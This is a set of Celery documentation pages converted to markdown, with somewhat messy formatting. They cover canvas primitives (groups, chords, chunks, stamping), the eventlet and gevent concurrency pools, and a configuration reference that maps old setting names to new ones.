A group is a signature object, so it can be used in combination `` ` with other signatures.  .. _group-callbacks:  Group Callbacks and Error Handling ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Groups can have callback and errback signatures linked to them as well, however the behaviour can be somewhat surprising due to the fact that groups are not real tasks and simply pass linked tasks down to their encapsulated signatures. This means that the return values of a group are not collected to be passed to a linked callback signature. Additionally, linking the task will *not* guarantee that it will activate only when all group tasks have finished. As an example, the following snippet using a simple `add(a, b)` task is faulty since the linked `add.s()` signature will not receive the finalised group result as one might expect. ``\`pycon \>\>\> g = group(add.s(2, 2), add.s(4, 4)) \>\>\> g.link(add.s()) \>\>\> res = g() \[4, 8\]

Note that the finalised results of the first two tasks are returned, but the `` ` callback signature will have run in the background and raised an exception since it did not receive the two arguments it expects.  Group errbacks are passed down to encapsulated signatures as well which opens the possibility for an errback linked only once to be called more than once if multiple tasks in a group were to fail. As an example, the following snippet using a `fail()` task which raises an exception can be expected to invoke the `log_error()` signature once for each failing task which gets run in the group. ``\`pycon \>\>\> g = group(fail.s(), fail.s()) \>\>\> g.link\_error(log\_error.s()) \>\>\> res = g()

With this in mind, it's generally advisable to create idempotent or counting `` ` tasks which are tolerant to being called repeatedly for use as errbacks.  These use cases are better addressed by the `~celery.chord` class which is supported on certain backend implementations.  .. _group-results:  Group Results ~~~~~~~~~~~~~  The group task returns a special result too, this result works just like normal task results, except that it works on the group as a whole: ``\`pycon \>\>\> from celery import group \>\>\> from tasks import add

> \>\>\> job = group(\[ ... add.s(2, 2), ... add.s(4, 4), ... add.s(8, 8), ... add.s(16, 16), ... add.s(32, 32), ... \])
> 
> \>\>\> result = job.apply\_async()
> 
> \>\>\> result.ready() \# have all subtasks completed? True \>\>\> result.successful() \# were all subtasks successful? True \>\>\> result.get() \[4, 8, 16, 32, 64\]

The <span class="title-ref">\~celery.result.GroupResult</span> takes a list of `` ` `~celery.result.AsyncResult` instances and operates on them as if it was a single task.  It supports the following operations:  * `~celery.result.GroupResult.successful`      Return `True` if all of the subtasks finished     successfully (e.g., didn't raise an exception).  * `~celery.result.GroupResult.failed`      Return `True` if any of the subtasks failed.  * `~celery.result.GroupResult.waiting`      Return `True` if any of the subtasks     isn't ready yet.  * `~celery.result.GroupResult.ready`      Return `True` if all of the subtasks     are ready.  * `~celery.result.GroupResult.completed_count`      Return the number of completed subtasks. Note that `complete` means `successful` in     this context. In other words, the return value of this method is the number of ``successful``tasks.  * `~celery.result.GroupResult.revoke`      Revoke all of the subtasks.  * `~celery.result.GroupResult.join`      Gather the results of all subtasks     and return them in the same order as they were called (as a list).  .. _canvas-chord:  Chords ------  .. versionadded:: 2.3  > **Note** >      Tasks used within a chord must *not* ignore their results. If the result     backend is disabled for *any* task (header or body) in your chord you     should read "[chord-important-notes](#chord-important-notes)". Chords are not currently     supported with the RPC result backend.   A chord is a task that only executes after all of the tasks in a group have finished executing.   Let's calculate the sum of the expression :math:`1 + 1 + 2 + 2 + 3 + 3 ... n + n` up to a hundred digits.  First you need two tasks, `add` and `tsum` (`sum` is already a standard function):``\`python @app.task def add(x, y): return x + y

> @app.task def tsum(numbers): return sum(numbers)

Now you can use a chord to calculate each addition step in parallel, and then `` ` get the sum of the resulting numbers: ``\`pycon \>\>\> from celery import chord \>\>\> from tasks import add, tsum

> \>\>\> chord(add.s(i, i) ... for i in range(100))(tsum.s()).get() 9900

This is obviously a very contrived example, the overhead of messaging and `` ` synchronization makes this a lot slower than its Python counterpart: ``\`pycon \>\>\> sum(i + i for i in range(100))

The synchronization step is costly, so you should avoid using chords as much `` ` as possible. Still, the chord is a powerful primitive to have in your toolbox as synchronization is a required step for many parallel algorithms.  Let's break the chord expression down: ``\`pycon \>\>\> callback = tsum.s() \>\>\> header = \[add.s(i, i) for i in range(100)\] \>\>\> result = chord(header)(callback) \>\>\> result.get() 9900

Remember, the callback can only be executed after all of the tasks in the `` ` header have returned. Each step in the header is executed as a task, in parallel, possibly on different nodes. The callback is then applied with the return value of each task in the header. The task id returned by `chord` is the id of the callback, so you can wait for it to complete and get the final return value (but remember to [never have a task wait for other tasks <task-synchronous-subtasks>](#never-have-a-task-wait for-other-tasks-<task-synchronous-subtasks>))  .. _chord-errors:  Error handling ~~~~~~~~~~~~~~  So what happens if one of the tasks raises an exception?  The chord callback result will transition to the failure state, and the error is set to the `~@ChordError` exception: ``\`pycon \>\>\> c = chord(\[add.s(4, 4), raising\_task.s(), add.s(8, 8)\]) \>\>\> result = c() \>\>\> result.get()

``` pytb
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "*/celery/result.py", line 120, in get
    interval=interval)
  File "*/celery/backends/amqp.py", line 150, in wait_for
    raise meta['result']
celery.exceptions.ChordError: Dependency 97de6f3f-ea67-4517-a21c-d867c61fcb47
    raised ValueError('something something',)
```

While the traceback may be different depending on the result backend used, `` ` you can see that the error description includes the id of the task that failed and a string representation of the original exception. You can also find the original traceback in ``result.traceback`.  Note that the rest of the tasks will still execute, so the third task (`add.s(8, 8)``) is still executed even though the middle task failed. Also the `~@ChordError` only shows the task that failed first (in time): it doesn't respect the ordering of the header group.  To perform an action when a chord fails you can therefore attach an errback to the chord callback:``\`python @app.task def on\_chord\_error(request, exc, traceback): print('Task {0\!r} raised error: {1\!r}'.format(request.id, exc))

``` pycon
>>> c = (group(add.s(i, i) for i in range(10)) |
...      tsum.s().on_error(on_chord_error.s())).delay()
```

Chords may have callback and errback signatures linked to them, which addresses `` ` some of the issues with linking signatures to groups. Doing so will link the provided signature to the chord's body which can be expected to gracefully invoke callbacks just once upon completion of the body, or errbacks just once if any task in the chord header or body fails.  This behavior can be manipulated to allow error handling of the chord header using the [task_allow_error_cb_on_chord_header <task_allow_error_cb_on_chord_header>](#task_allow_error_cb_on_chord_header-<task_allow_error_cb_on_chord_header>) flag. Enabling this flag will cause the chord header to invoke the errback for the body (default behavior) *and* any task in the chord's header that fails.  .. _chord-important-notes:  Important Notes ~~~~~~~~~~~~~~~  Tasks used within a chord must *not* ignore their results. In practice this means that you must enable a `result_backend` in order to use chords. Additionally, if `task_ignore_result` is set to `True` in your configuration, be sure that the individual tasks to be used within the chord are defined with `ignore_result=False`. This applies to both Task subclasses and decorated tasks.  Example Task subclass: ``\`python class MyTask(Task): ignore\_result = False

Example decorated task:

``` python
@app.task(ignore_result=False)
def another_task(project):
    do_something()
```

By default the synchronization step is implemented by having a recurring task `` ` poll the completion of the group every second, calling the signature when ready.  Example implementation: ``\`python from celery import maybe\_signature

> @app.task(bind=True) def unlock\_chord(self, group, callback, interval=1, max\_retries=None): if group.ready(): return maybe\_signature(callback).delay(group.join()) raise self.retry(countdown=interval, max\_retries=max\_retries)

This is used by all result backends except Redis, Memcached and DynamoDB: they `` ` increment a counter after each task in the header, then applies the callback when the counter exceeds the number of tasks in the set.  The Redis, Memcached and DynamoDB approach is a much better solution, but not easily implemented in other backends (suggestions welcome!).  > **Note** >     Chords don't properly work with Redis before version 2.2; you'll need to    upgrade to at least redis-server 2.2 to use them.  .. note::      If you're using chords with the Redis result backend and also overriding     the `Task.after_return` method, you need to make sure to call the     super method or else the chord callback won't be applied. ``\`python def after\_return(self, *args,kwargs): do\_something() super().after\_return(*args, \*\*kwargs)

<div id="canvas-map">

Map & Starmap `` ` -------------  `~celery.map` and `~celery.starmap` are built-in tasks that call the provided calling task for every element in a sequence.  They differ from `~celery.group` in that:  - only one task message is sent.  - the operation is sequential.  For example using ``map`:`\`pycon \>\>\> from proj.tasks import add

</div>

> \>\>\> \~tsum.map(\[list(range(10)), list(range(100))\]) \[45, 4950\]

is the same as having a task doing:

``` python
@app.task
def temp():
    return [tsum(range(10)), tsum(range(100))]
```

and using `starmap`:

``` pycon
>>> ~add.starmap(zip(range(10), range(10)))
[0, 2, 4, 6, 8, 10, 12, 14, 16, 18]
```

is the same as having a task doing:

``` python
@app.task
def temp():
    return [add(i, i) for i in range(10)]
```

Both `map` and `starmap` are signature objects, so they can be used as `` ` other signatures and combined in groups etc., for example to call the starmap after 10 seconds: ``\`pycon \>\>\> add.starmap(zip(range(10), range(10))).apply\_async(countdown=10)

<div id="canvas-chunks">

Chunks `` ` ------  Chunking lets you divide an iterable of work into pieces, so that if you have one million objects, you can create 10 tasks with a hundred thousand objects each.  Some may worry that chunking your tasks results in a degradation of parallelism, but this is rarely true for a busy cluster and in practice since you're avoiding the overhead  of messaging it may considerably increase performance.  To create a chunks' signature you can use `@Task.chunks`: ``\`pycon \>\>\> add.chunks(zip(range(100), range(100)), 10)

</div>

As with <span class="title-ref">\~celery.group</span> the act of sending the messages for `` ` the chunks will happen in the current process when called: ``\`pycon \>\>\> from proj.tasks import add

> \>\>\> res = add.chunks(zip(range(100), range(100)), 10)() \>\>\> res.get() \[\[0, 2, 4, 6, 8, 10, 12, 14, 16, 18\], \[20, 22, 24, 26, 28, 30, 32, 34, 36, 38\], \[40, 42, 44, 46, 48, 50, 52, 54, 56, 58\], \[60, 62, 64, 66, 68, 70, 72, 74, 76, 78\], \[80, 82, 84, 86, 88, 90, 92, 94, 96, 98\], \[100, 102, 104, 106, 108, 110, 112, 114, 116, 118\], \[120, 122, 124, 126, 128, 130, 132, 134, 136, 138\], \[140, 142, 144, 146, 148, 150, 152, 154, 156, 158\], \[160, 162, 164, 166, 168, 170, 172, 174, 176, 178\], \[180, 182, 184, 186, 188, 190, 192, 194, 196, 198\]\]

while calling `.apply_async` will create a dedicated `` ` task so that the individual tasks are applied in a worker instead: ``\`pycon \>\>\> add.chunks(zip(range(100), range(100)), 10).apply\_async()

You can also convert chunks to a group:

``` pycon
>>> group = add.chunks(zip(range(100), range(100)), 10).group()
```

and with the group skew the countdown of each task by increments `` ` of one: ``\`pycon \>\>\> group.skew(start=1, stop=10)()

This means that the first task will have a countdown of one second, the second `` ` task a countdown of two seconds, and so on.  Stamping ========  .. versionadded:: 5.3  The goal of the Stamping API is to give an ability to label the signature and its components for debugging information purposes. For example, when the canvas is a complex structure, it may be necessary to label some or all elements of the formed structure. The complexity increases even more when nested groups are rolled-out or chain elements are replaced. In such cases, it may be necessary to understand which group an element is a part of or on what nested level it is. This requires a mechanism that traverses the canvas elements and marks them with specific metadata. The stamping API allows doing that based on the Visitor pattern.  For example, ``\`pycon \>\>\> sig1 = add.si(2, 2) \>\>\> sig1\_res = sig1.freeze() \>\>\> g = group(sig1, add.si(3, 3)) \>\>\> g.stamp(stamp='your\_custom\_stamp') \>\>\> res = g.apply\_async() \>\>\> res.get(timeout=TIMEOUT) \[4, 6\] \>\>\> sig1\_res.\_get\_task\_meta()\['stamp'\] \['your\_custom\_stamp'\]

will initialize a group `g` and mark its components with stamp `your_custom_stamp`.

For this feature to be useful, you need to set the `result_extended` `` ` configuration option to ``True`or directive`result\_extended = True`.  Canvas stamping ----------------  We can also stamp the canvas with custom stamping logic, using the visitor class`StampingVisitor`as the base class for the custom stamping visitor.  Custom stamping ----------------  If more complex stamping logic is required, it is possible to implement custom stamping behavior based on the Visitor pattern. The class that implements this custom logic must inherit`StampingVisitor`and implement appropriate methods.  For example, the following example`InGroupVisitor`will label tasks that are in side of some group by label`in\_group`.`\`python class InGroupVisitor(StampingVisitor): def \_\_init\_\_(self): self.in\_group = False

>   - def on\_group\_start(self, group, \*\*headers) -\> dict:  
>     self.in\_group = True return {"in\_group": \[self.in\_group\], "stamped\_headers": \["in\_group"\]}
> 
>   - def on\_group\_end(self, group, \*\*headers) -\> None:  
>     self.in\_group = False
> 
>   - def on\_chain\_start(self, chain, \*\*headers) -\> dict:  
>     return {"in\_group": \[self.in\_group\], "stamped\_headers": \["in\_group"\]}
> 
>   - def on\_signature(self, sig, \*\*headers) -\> dict:  
>     return {"in\_group": \[self.in\_group\], "stamped\_headers": \["in\_group"\]}

The following example shows another custom stamping visitor, which labels all `` ` tasks with a custom ``monitoring\_id`which can represent a UUID value of an external monitoring system, that can be used to track the task execution by including the id with such a visitor implementation. This`monitoring\_id`can be a randomly generated UUID, or a unique identifier of the span id used by the external monitoring system, etc.`\`python class MonitoringIdStampingVisitor(StampingVisitor): def on\_signature(self, sig, \*\*headers) -\> dict: return {'monitoring\_id': uuid4().hex}

\> **Note** \> The `stamped_headers` key returned in `on_signature` (or any other visitor method) is used to specify the headers that will be stamped on the task. If this key is not specified, the stamping visitor will assume all keys in the returned dictionary are the stamped headers from the visitor.

> This means the following code block will result in the same behavior as the previous example.

``` python
class MonitoringIdStampingVisitor(StampingVisitor):
    def on_signature(self, sig, **headers) -> dict:
        return {'monitoring_id': uuid4().hex, 'stamped_headers': ['monitoring_id']}
```

Next, let's see how to use the `MonitoringIdStampingVisitor` example stamping visitor.

``` python
sig_example = signature('t1')
sig_example.stamp(visitor=MonitoringIdStampingVisitor())

group_example = group([signature('t1'), signature('t2')])
group_example.stamp(visitor=MonitoringIdStampingVisitor())

chord_example = chord([signature('t1'), signature('t2')], signature('t3'))
chord_example.stamp(visitor=MonitoringIdStampingVisitor())

chain_example = chain(signature('t1'), group(signature('t2'), signature('t3')), signature('t4'))
chain_example.stamp(visitor=MonitoringIdStampingVisitor())
```

Lastly, it's important to mention that each monitoring id stamp in the example above would be different from each other between tasks.

Callbacks stamping `` ` ------------------  The stamping API also supports stamping callbacks implicitly. This means that when a callback is added to a task, the stamping visitor will be applied to the callback as well.  > **Warning** >      The callback must be linked to the signature before stamping.  For example, let's examine the following custom stamping visitor. ``\`python class CustomStampingVisitor(StampingVisitor): def on\_signature(self, sig, \*\*headers) -\> dict: return {'header': 'value'}

>   - def on\_callback(self, callback, \*\*header) -\> dict:  
>     return {'on\_callback': True}
> 
>   - def on\_errback(self, errback, \*\*header) -\> dict:  
>     return {'on\_errback': True}

This custom stamping visitor will stamp the signature, callbacks, and errbacks with `{'header': 'value'}` `` ` and stamp the callbacks and errbacks with ``{'on\_callback': True}`and`{'on\_errback': True}`respectively as shown below.`\`python c = chord(\[add.s(1, 1), add.s(2, 2)\], xsum.s()) callback = signature('sig\_link') errback = signature('sig\_link\_error') c.link(callback) c.link\_error(errback) c.stamp(visitor=CustomStampingVisitor())

This example will result in the following stamps:

``` python
>>> c.options
{'header': 'value', 'stamped_headers': ['header']}
>>> c.tasks.tasks[0].options
{'header': 'value', 'stamped_headers': ['header']}
>>> c.tasks.tasks[1].options
{'header': 'value', 'stamped_headers': ['header']}
>>> c.body.options
{'header': 'value', 'stamped_headers': ['header']}
>>> c.body.options['link'][0].options
{'header': 'value', 'on_callback': True, 'stamped_headers': ['header', 'on_callback']}
>>> c.body.options['link_error'][0].options
{'header': 'value', 'on_errback': True, 'stamped_headers': ['header', 'on_errback']}
```

\`\`\`

---

eventlet.md

---

# Concurrency with Eventlet

## Introduction

The [Eventlet](http://eventlet.net) homepage describes it as a concurrent networking library for Python that allows you to change how you run your code, not how you write it.

>   - It uses [epoll(4)](http://linux.die.net/man/4/epoll) or [libevent](http://monkey.org/~provos/libevent/) for [highly scalable non-blocking I/O](https://en.wikipedia.org/wiki/Asynchronous_I/O#Select.28.2Fpoll.29_loops).
>   - [Coroutines](https://en.wikipedia.org/wiki/Coroutine) ensure that the developer uses a blocking style of programming that's similar to threading, but provide the benefits of non-blocking I/O.
>   - The event dispatch is implicit: meaning you can easily use Eventlet from the Python interpreter, or as a small part of a larger application.

Celery supports Eventlet as an alternative execution pool implementation and in some cases superior to prefork. However, you need to ensure one task doesn't block the event loop too long. Generally, CPU-bound operations don't go well with Eventlet. Also note that some libraries, usually with C extensions, cannot be monkeypatched and therefore cannot benefit from using Eventlet. Please refer to their documentation if you are not sure. For example, pylibmc does not allow cooperation with Eventlet but psycopg2 does when both of them are libraries with C extensions.

The prefork pool can take use of multiple processes, but how many is often limited to a few processes per CPU. With Eventlet you can efficiently spawn hundreds, or thousands of green threads. In an informal test with a feed hub system the Eventlet pool could fetch and process hundreds of feeds every second, while the prefork pool spent 14 seconds processing 100 feeds. Note that this is one of the applications async I/O is especially good at (asynchronous HTTP requests). You may want a mix of both Eventlet and prefork workers, and route tasks according to compatibility or what works best.

## Enabling Eventlet

You can enable the Eventlet pool by using the `celery worker -P` worker option.

`` `console     $ celery -A proj worker -P eventlet -c 1000  .. _eventlet-examples:  Examples ``\` ========

See the [Eventlet examples](https://github.com/celery/celery/tree/main/examples/eventlet) directory in the Celery distribution for some examples taking use of Eventlet support.

---

gevent.md

---

# Concurrency with gevent

## Introduction

The [gevent](http://www.gevent.org/) homepage describes it a [coroutine](https://en.wikipedia.org/wiki/Coroutine) -based [Python](http://python.org) networking library that uses [greenlet](https://greenlet.readthedocs.io) to provide a high-level synchronous API on top of the [libev](http://software.schmorp.de/pkg/libev.html) or [libuv](http://libuv.org) event loop.

Features include:

  - Fast event loop based on [libev](http://software.schmorp.de/pkg/libev.html) or [libuv](http://libuv.org).
  - Lightweight execution units based on greenlets.
  - API that re-uses concepts from the Python standard library (for examples there are [events](http://www.gevent.org/api/gevent.event.html#gevent.event.Event) and [queues](http://www.gevent.org/api/gevent.queue.html#gevent.queue.Queue)).
  - [Cooperative sockets with SSL support](http://www.gevent.org/api/index.html#networking)
  - [Cooperative DNS queries](http://www.gevent.org/dns.html) performed through a threadpool, dnspython, or c-ares.
  - [Monkey patching utility](http://www.gevent.org/intro.html#monkey-patching) to get 3rd party modules to become cooperative
  - TCP/UDP/HTTP servers
  - Subprocess support (through [gevent.subprocess](http://www.gevent.org/api/gevent.subprocess.html#module-gevent.subprocess))
  - Thread pools

gevent is [inspired by eventlet](http://blog.gevent.org/2010/02/27/why-gevent/) but features a more consistent API, simpler implementation and better performance. Read why others [use gevent](http://groups.google.com/group/gevent/browse_thread/thread/4de9703e5dca8271) and check out the list of the [open source projects based on gevent](https://github.com/gevent/gevent/wiki/Projects).

## Enabling gevent

You can enable the gevent pool by using the `celery worker -P gevent` or `celery worker --pool=gevent` worker option.

`` `console     $ celery -A proj worker -P gevent -c 1000  .. _eventlet-examples:  Examples ``\` ========

See the [gevent examples](https://github.com/celery/celery/tree/main/examples/gevent) directory in the Celery distribution for some examples taking use of Eventlet support.

## Known issues

There is a known issue using python 3.11 and gevent. The issue is documented [here](https://github.com/celery/celery/issues/8425) and addressed in a [gevent issue](https://github.com/gevent/gevent/issues/1985). Upgrading to greenlet 3.0 solves it.

---

index.md

---

# Concurrency

  - Release  

  - Date  

Concurrency in Celery enables the parallel execution of tasks. The default model, <span class="title-ref">prefork</span>, is well-suited for many scenarios and generally recommended for most users. In fact, switching to another mode will silently disable certain features like <span class="title-ref">soft\_timeout</span> and <span class="title-ref">max\_tasks\_per\_child</span>.

This page gives a quick overview of the available options which you can pick between using the <span class="title-ref">--pool</span> option when starting the worker.

## Overview of Concurrency Options

  - \`prefork\`: The default option, ideal for CPU-bound tasks and most use cases. It is robust and recommended unless there's a specific need for another model.
  - <span class="title-ref">eventlet</span> and \`gevent\`: Designed for IO-bound tasks, these models use greenlets for high concurrency. Note that certain features, like <span class="title-ref">soft\_timeout</span>, are not available in these modes. These have detailed documentation pages linked below.
  - \`solo\`: Executes tasks sequentially in the main thread.
  - \`threads\`: Utilizes threading for concurrency, available if the <span class="title-ref">concurrent.futures</span> module is present.
  - \`custom\`: Enables specifying a custom worker pool implementation through environment variables.

<div class="toctree" data-maxdepth="2">

eventlet gevent

</div>

<div class="note">

<div class="title">

Note

</div>

While alternative models like <span class="title-ref">eventlet</span> and <span class="title-ref">gevent</span> are available, they may lack certain features compared to <span class="title-ref">prefork</span>. We recommend <span class="title-ref">prefork</span> as the starting point unless specific requirements dictate otherwise.

</div>

---

configuration.md

---

# Configuration and defaults

This document describes the configuration options available.

If you're using the default loader, you must create the `celeryconfig.py` module and make sure it's available on the Python path.

<div class="contents" data-local="" data-depth="2">

</div>

## Example configuration file

This is an example configuration file to get you started. It should contain all you need to run a basic Celery set-up.

`` `python     ## Broker settings.     broker_url = 'amqp://guest:guest@localhost:5672//'      # List of modules to import when the Celery worker starts.     imports = ('myapp.tasks',)      ## Using the database to store task state and results.     result_backend = 'db+sqlite:///results.db'      task_annotations = {'tasks.add': {'rate_limit': '10/s'}}   .. _conf-old-settings-map:  New lowercase settings ``\` ======================

Version 4.0 introduced new lower case settings and setting organization.

The major difference between previous versions, apart from the lower case names, are the renaming of some prefixes, like `celery_beat_` to `beat_`, `celeryd_` to `worker_`, and most of the top level `celery_` settings have been moved into a new `task_` prefix.

\> **Warning** \> Celery will still be able to read old configuration files until Celery 6.0. Afterwards, support for the old configuration files will be removed. We provide the `celery upgrade` command that should handle plenty of cases (including \[Django \<latentcall-django-admonition\>\](\#django-\<latentcall-django-admonition\>)).

> Please migrate to the new configuration scheme as soon as possible.

| **Setting name**                                   | **Replace with**                                                                            |
| -------------------------------------------------- | ------------------------------------------------------------------------------------------- |
| `CELERY_ACCEPT_CONTENT`                            | `accept_content`                                                                            |
| `CELERY_ENABLE_UTC`                                | `enable_utc`                                                                                |
| `CELERY_IMPORTS`                                   | `imports`                                                                                   |
| `CELERY_INCLUDE`                                   | `include`                                                                                   |
| `CELERY_TIMEZONE`                                  | `timezone`                                                                                  |
| `CELERYBEAT_MAX_LOOP_INTERVAL`                     | `beat_max_loop_interval`                                                                    |
| `CELERYBEAT_SCHEDULE`                              | `beat_schedule`                                                                             |
| `CELERYBEAT_SCHEDULER`                             | `beat_scheduler`                                                                            |
| `CELERYBEAT_SCHEDULE_FILENAME`                     | `beat_schedule_filename`                                                                    |
| `CELERYBEAT_SYNC_EVERY`                            | `beat_sync_every`                                                                           |
| `BROKER_URL`                                       | `broker_url`                                                                                |
| `BROKER_TRANSPORT`                                 | `broker_transport`                                                                          |
| `BROKER_TRANSPORT_OPTIONS`                         | `broker_transport_options`                                                                  |
| `BROKER_CONNECTION_TIMEOUT`                        | `broker_connection_timeout`                                                                 |
| `BROKER_CONNECTION_RETRY`                          | `broker_connection_retry`                                                                   |
| `BROKER_CONNECTION_MAX_RETRIES`                    | `broker_connection_max_retries`                                                             |
| `BROKER_FAILOVER_STRATEGY`                         | `broker_failover_strategy`                                                                  |
| `BROKER_HEARTBEAT`                                 | `broker_heartbeat`                                                                          |
| `BROKER_LOGIN_METHOD`                              | `broker_login_method`                                                                       |
| \`\`BROKER\_NATIVE\_DELAYED\_DELIVERY\_QUEUE\_TYPE | \`<span class="title-ref"> :setting:\`broker\_native\_delayed\_delivery\_queue\_type</span> |
| `BROKER_POOL_LIMIT`                                | `broker_pool_limit`                                                                         |
| `BROKER_USE_SSL`                                   | `broker_use_ssl`                                                                            |
| `CELERY_CACHE_BACKEND`                             | `cache_backend`                                                                             |
| `CELERY_CACHE_BACKEND_OPTIONS`                     | `cache_backend_options`                                                                     |
| `CASSANDRA_COLUMN_FAMILY`                          | `cassandra_table`                                                                           |
| `CASSANDRA_ENTRY_TTL`                              | `cassandra_entry_ttl`                                                                       |
| `CASSANDRA_KEYSPACE`                               | `cassandra_keyspace`                                                                        |
| `CASSANDRA_PORT`                                   | `cassandra_port`                                                                            |
| `CASSANDRA_READ_CONSISTENCY`                       | `cassandra_read_consistency`                                                                |
| `CASSANDRA_SERVERS`                                | `cassandra_servers`                                                                         |
| `CASSANDRA_WRITE_CONSISTENCY`                      | `cassandra_write_consistency`                                                               |
| `CASSANDRA_OPTIONS`                                | `cassandra_options`                                                                         |
| `S3_ACCESS_KEY_ID`                                 | `s3_access_key_id`                                                                          |
| `S3_SECRET_ACCESS_KEY`                             | `s3_secret_access_key`                                                                      |
| `S3_BUCKET`                                        | `s3_bucket`                                                                                 |
| `S3_BASE_PATH`                                     | `s3_base_path`                                                                              |
| `S3_ENDPOINT_URL`                                  | `s3_endpoint_url`                                                                           |
| `S3_REGION`                                        | `s3_region`                                                                                 |
| `CELERY_COUCHBASE_BACKEND_SETTINGS`                | `couchbase_backend_settings`                                                                |
| `CELERY_ARANGODB_BACKEND_SETTINGS`                 | `arangodb_backend_settings`                                                                 |
| `CELERY_MONGODB_BACKEND_SETTINGS`                  | `mongodb_backend_settings`                                                                  |
| `CELERY_EVENT_QUEUE_EXPIRES`                       | `event_queue_expires`                                                                       |
| `CELERY_EVENT_QUEUE_TTL`                           | `event_queue_ttl`                                                                           |
| `CELERY_EVENT_QUEUE_PREFIX`                        | `event_queue_prefix`                                                                        |
| `CELERY_EVENT_SERIALIZER`                          | `event_serializer`                                                                          |
| `CELERY_REDIS_DB`                                  | `redis_db`                                                                                  |
| `CELERY_REDIS_HOST`                                | `redis_host`                                                                                |
| `CELERY_REDIS_MAX_CONNECTIONS`                     | `redis_max_connections`                                                                     |
| `CELERY_REDIS_USERNAME`                            | `redis_username`                                                                            |
| `CELERY_REDIS_PASSWORD`                            | `redis_password`                                                                            |
| `CELERY_REDIS_PORT`                                | `redis_port`                                                                                |
| `CELERY_REDIS_BACKEND_USE_SSL`                     | `redis_backend_use_ssl`                                                                     |
| `CELERY_RESULT_BACKEND`                            | `result_backend`                                                                            |
| `CELERY_MAX_CACHED_RESULTS`                        | `result_cache_max`                                                                          |
| `CELERY_MESSAGE_COMPRESSION`                       | `result_compression`                                                                        |
| `CELERY_RESULT_EXCHANGE`                           | `result_exchange`                                                                           |
| `CELERY_RESULT_EXCHANGE_TYPE`                      | `result_exchange_type`                                                                      |
| `CELERY_RESULT_EXPIRES`                            | `result_expires`                                                                            |
| `CELERY_RESULT_PERSISTENT`                         | `result_persistent`                                                                         |
| `CELERY_RESULT_SERIALIZER`                         | `result_serializer`                                                                         |
| `CELERY_RESULT_DBURI`                              | Use `result_backend` instead.                                                               |
| `CELERY_RESULT_ENGINE_OPTIONS`                     | `database_engine_options`                                                                   |
| `[...]_DB_SHORT_LIVED_SESSIONS`                    | `database_short_lived_sessions`                                                             |
| `CELERY_RESULT_DB_TABLE_NAMES`                     | `database_db_names`                                                                         |
| `CELERY_SECURITY_CERTIFICATE`                      | `security_certificate`                                                                      |
| `CELERY_SECURITY_CERT_STORE`                       | `security_cert_store`                                                                       |
| `CELERY_SECURITY_KEY`                              | `security_key`                                                                              |
| `CELERY_SECURITY_KEY_PASSWORD`                     | `security_key_password`                                                                     |
| `CELERY_ACKS_LATE`                                 | `task_acks_late`                                                                            |
| `CELERY_ACKS_ON_FAILURE_OR_TIMEOUT`                | `task_acks_on_failure_or_timeout`                                                           |
| `CELERY_TASK_ALWAYS_EAGER`                         | `task_always_eager`                                                                         |
| `CELERY_ANNOTATIONS`                               | `task_annotations`                                                                          |
| `CELERY_COMPRESSION`                               | `task_compression`                                                                          |
| `CELERY_CREATE_MISSING_QUEUES`                     | `task_create_missing_queues`                                                                |
| `CELERY_DEFAULT_DELIVERY_MODE`                     | `task_default_delivery_mode`                                                                |
| `CELERY_DEFAULT_EXCHANGE`                          | `task_default_exchange`                                                                     |
| `CELERY_DEFAULT_EXCHANGE_TYPE`                     | `task_default_exchange_type`                                                                |
| `CELERY_DEFAULT_QUEUE`                             | `task_default_queue`                                                                        |
| `CELERY_DEFAULT_QUEUE_TYPE`                        | `task_default_queue_type`                                                                   |
| `CELERY_DEFAULT_RATE_LIMIT`                        | `task_default_rate_limit`                                                                   |
| `CELERY_DEFAULT_ROUTING_KEY`                       | `task_default_routing_key`                                                                  |
| `CELERY_EAGER_PROPAGATES`                          | `task_eager_propagates`                                                                     |
| `CELERY_IGNORE_RESULT`                             | `task_ignore_result`                                                                        |
| `CELERY_PUBLISH_RETRY`                             | `task_publish_retry`                                                                        |
| `CELERY_PUBLISH_RETRY_POLICY`                      | `task_publish_retry_policy`                                                                 |
| `CELERY_QUEUES`                                    | `task_queues`                                                                               |
| `CELERY_ROUTES`                                    | `task_routes`                                                                               |
| `CELERY_SEND_SENT_EVENT`                           | `task_send_sent_event`                                                                      |
| `CELERY_TASK_SERIALIZER`                           | `task_serializer`                                                                           |
| `CELERYD_SOFT_TIME_LIMIT`                          | `task_soft_time_limit`                                                                      |
| `CELERY_TASK_TRACK_STARTED`                        | `task_track_started`                                                                        |
| `CELERY_TASK_REJECT_ON_WORKER_LOST`                | `task_reject_on_worker_lost`                                                                |
| `CELERYD_TIME_LIMIT`                               | `task_time_limit`                                                                           |
| `CELERY_ALLOW_ERROR_CB_ON_CHORD_HEADER`            | `task_allow_error_cb_on_chord_header`                                                       |
| `CELERYD_AGENT`                                    | `worker_agent`                                                                              |
| `CELERYD_AUTOSCALER`                               | `worker_autoscaler`                                                                         |
| `CELERYD_CONCURRENCY`                              | `worker_concurrency`                                                                        |
| `CELERYD_CONSUMER`                                 | `worker_consumer`                                                                           |
| `CELERY_WORKER_DIRECT`                             | `worker_direct`                                                                             |
| `CELERY_DISABLE_RATE_LIMITS`                       | `worker_disable_rate_limits`                                                                |
| `CELERY_ENABLE_REMOTE_CONTROL`                     | `worker_enable_remote_control`                                                              |
| `CELERYD_HIJACK_ROOT_LOGGER`                       | `worker_hijack_root_logger`                                                                 |
| `CELERYD_LOG_COLOR`                                | `worker_log_color`                                                                          |
| `CELERY_WORKER_LOG_FORMAT`                         | `worker_log_format`                                                                         |
| `CELERYD_WORKER_LOST_WAIT`                         | `worker_lost_wait`                                                                          |
| `CELERYD_MAX_TASKS_PER_CHILD`                      | `worker_max_tasks_per_child`                                                                |
| `CELERYD_POOL`                                     | `worker_pool`                                                                               |
| `CELERYD_POOL_PUTLOCKS`                            | `worker_pool_putlocks`                                                                      |
| `CELERYD_POOL_RESTARTS`                            | `worker_pool_restarts`                                                                      |
| `CELERYD_PREFETCH_MULTIPLIER`                      | `worker_prefetch_multiplier`                                                                |
| `CELERYD_ENABLE_PREFETCH_COUNT_REDUCTION`          | `worker_enable_prefetch_count_reduction`                                                    |
| `CELERYD_REDIRECT_STDOUTS`                         | `worker_redirect_stdouts`                                                                   |
| `CELERYD_REDIRECT_STDOUTS_LEVEL`                   | `worker_redirect_stdouts_level`                                                             |
